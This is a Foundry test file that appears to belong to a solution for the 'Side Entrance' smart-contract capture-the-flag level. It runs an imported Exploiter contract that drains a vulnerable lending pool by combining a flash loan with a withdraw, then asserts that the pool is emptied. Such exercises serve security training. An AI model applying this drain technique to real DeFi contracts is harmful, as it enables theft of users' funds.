// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
import {Exploiter} from "../../../src/Contracts/side-entrance/Exploiter.sol";

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance = 0e18;
    uint256 public zeroValue = 0;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        //console.log("Balance of Attacker before Attack (In Set Up) : ", address(attacker).balance);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        Exploiter exploit;
        exploit = new Exploiter(address(sideEntranceLenderPool));

        console.log("Balance of Attacker before Attack : ", attackerInitialEthBalance);
        console.log("Balance of Pool before Attack : ", address(sideEntranceLenderPool).balance);

        exploit.attackContract(address(sideEntranceLenderPool).balance); // calling the attackContract function which calls flashloan and withdraw. flashloan extends to execute which is the interface function

        vm.stopPrank();

        console.log("Balance of Attacker after Attack : ", address(attacker).balance);
        console.log("Balance of Pool after Attack : ", address(sideEntranceLenderPool).balance);

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
